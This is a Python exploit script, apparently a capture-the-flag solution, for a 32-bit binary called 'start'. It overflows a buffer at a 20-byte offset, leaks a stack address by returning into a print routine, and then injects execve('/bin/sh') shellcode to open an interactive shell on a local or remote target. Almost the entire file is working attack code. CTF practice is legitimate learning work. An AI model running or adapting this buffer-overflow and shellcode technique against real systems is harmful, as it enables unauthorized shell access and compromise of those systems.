#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./start', checksec=False)
context.arch = 'i386'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*0x08048097
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

'''
0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
'''

def exploit():

    offset = 20
    print_stack = 0x08048087

    pl = cyclic(offset) + p32(print_stack)
    
    ru(b'CTF:')
    s(pl) 

    stack_leak = u32(p.recv(4))
    slog('Stack leak', stack_leak)


    shellcode = asm('''
        mov al, 0xb
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
        ''')

    pl = shellcode.ljust(20, b'\x00') + p32(stack_leak - 4) + b'/bin/sh\0'
    s(pl)

    interactive()

if __name__ == '__main__':
  exploit()
